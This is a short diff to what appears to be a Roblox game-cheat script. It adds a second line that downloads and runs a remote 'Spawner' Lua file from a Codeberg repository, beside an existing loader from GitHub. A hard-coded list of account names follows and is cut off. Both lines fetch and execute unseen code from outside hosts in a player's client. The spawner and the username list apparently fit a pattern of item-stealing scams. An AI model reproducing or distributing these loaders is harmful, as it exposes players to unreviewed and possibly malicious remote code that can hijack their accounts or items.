@@ -1,5 +1,8 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+
 users = {
     'ajandaa12alt1',
     'ajandaa12alt',
